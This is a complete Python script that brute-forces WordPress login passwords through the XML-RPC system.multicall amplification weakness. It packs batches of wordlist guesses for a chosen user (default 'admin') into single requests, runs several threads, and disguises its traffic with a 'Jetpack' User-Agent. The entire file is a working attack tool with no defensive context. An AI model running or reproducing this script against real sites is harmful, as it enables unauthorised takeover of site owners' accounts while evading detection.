#!/usr/bin/env python

import argparse
import logging
import Queue
import requests
import sys
import threading
import time
import xml.etree.ElementTree as XmlTree

from datetime import datetime

logging.basicConfig(format='%(asctime)s %(name)s %(levelname)s %(message)s')
log = logging.getLogger('wpxmlbrute')

# silence log messages from requests
logging.getLogger('requests').setLevel(logging.CRITICAL)

XML_START = (
    "<?xml version=\"1.0\" encoding=\"UTF-8\"?><methodCall><methodName>"
    "system.multicall</methodName> <params><param><value><array><data><value>"
)
XML_END = "</value></data></array></value></param></params></methodCall>"
XML_REQ = (
    "<struct><member><name>methodName</name><value><string>wp.getAuthors"
    "</string></value></member><member><name>params</name><value><array><data>"
    "<value><string>1</string></value><value><string>%s</string></value><value>"
    "<string>%s</string></value></data></array></value></member></struct>"
)

DEFAULT_USER_AGENT = "Jetpack"

def generate_request_body(user, passwords):
    body = [XML_START]
    for password in passwords:
        body.append(XML_REQ % (user, password))
    body.append(XML_END)
    return ''.join(body)

def brute_attempt(url, user, passwords):
    body = generate_request_body(user, passwords)
    headers = {
        'Content-Type': 'application/xml',
        'User-Agent': DEFAULT_USER_AGENT
    }

    result = requests.post(url, data=body, headers=headers)
    xml_root = XmlTree.fromstring(result.text)

    i = 0
    for elem in xml_root.findall('.//struct'):
        if elem[0].findtext('name') != 'faultCode':
            return passwords[i]
        i += 1

    return None

def brute_consumer(queue, results, url, user):
    while not queue.empty():
        try:
            passwords = queue.get()
        except Queue.Empty:
            break

        result = brute_attempt(url, user, passwords)

        if result != None:
            results.append(result)

def populate_queue(queue, wordlist, count):
    with open(wordlist) as f:
        group = []
        while True:
            line = f.readline()

            # Empty string is the EOF
            if line == '':
                if len(group) > 0:
                    log.debug("Finished processing %s. Waiting for workers to "
                              "complete." % wordlist)
                    queue.put(group, block=True)
                break

            group.append(line.strip())

            if len(group) == count:
                queue.put(group, block=True)
                group = []

def main():
    desc = "Brute force WordPress sites vulnerable to XML-RPC amplification."
    parser = argparse.ArgumentParser(description=desc)

    parser.add_argument('-c', '--count', type=int, default=100,
        help="Number of passwords to send in each request. Default: 100")
    parser.add_argument('-t', '--threads', type=int, default=4,
        help="Number of threads to spawn. Default: 4")
    parser.add_argument('-u', '--user', default="admin",
        help="WordPress username to brute force. Default: admin")
    # TODO: This doesn't actually do anything
    #parser.add_argument('-a', '--user-agent', default="")
    parser.add_argument('-l', '--level', type=int, default=1,
        help="Log level (1-5). 1 = debug, 5 = critical. Default: 1")
    parser.add_argument('url', help="URL of WordPress site to brute force")
    parser.add_argument('wordlist', help="Path of the password list to use")

    args = parser.parse_args()

    log.setLevel(args.level*10)

    if args.count < 1:
        raise SystemExit("count should be >= 0")

    if not args.url.endswith('xmlrpc.php'):
        if not args.url.endswith('/'):
            args.url += '/'
        args.url += 'xmlrpc.php'

    threads = []
    queue = Queue.Queue(maxsize=args.threads*10)
    results = []

    start_time = datetime.now()

    producer = threading.Thread(
        target=populate_queue,
        args=(queue, args.wordlist, args.count)
    )
    producer.daemon = True
    producer.start()

    while queue.qsize() < args.threads:
        log.debug("Waiting for queue to populate. Size: %s" % queue.qsize())
        time.sleep(0.1)

    for i in range(args.threads):
        t = threading.Thread(
            target=brute_consumer,
            args=(
                queue, results, args.url, args.user
            )
        )
        log.debug("Starting %s" % t.name)
        t.daemon = True
        t.start()
        threads.append(t)

    while True:
        for t in threads:
            if t.is_alive():
                t.join(0.25)
            else:
                log.debug("%s complete" % t.name)
                threads.remove(t)

        log.debug("Threads running: %s" % len(threads))
        log.debug("Queue size: %s" % queue.qsize())

        if len(threads) == 0 or len(results) > 0:
            break

    log.debug("Results: %s" % results)
    log.info(("Elapsed time: %s" % (datetime.now() - start_time)))

    if len(results) > 0:
        print("Password found for %s: %s" % (args.user, results[0]))
    else:
        print("Password not found in wordlist")
        sys.exit(1)

if __name__ == '__main__':
    main()
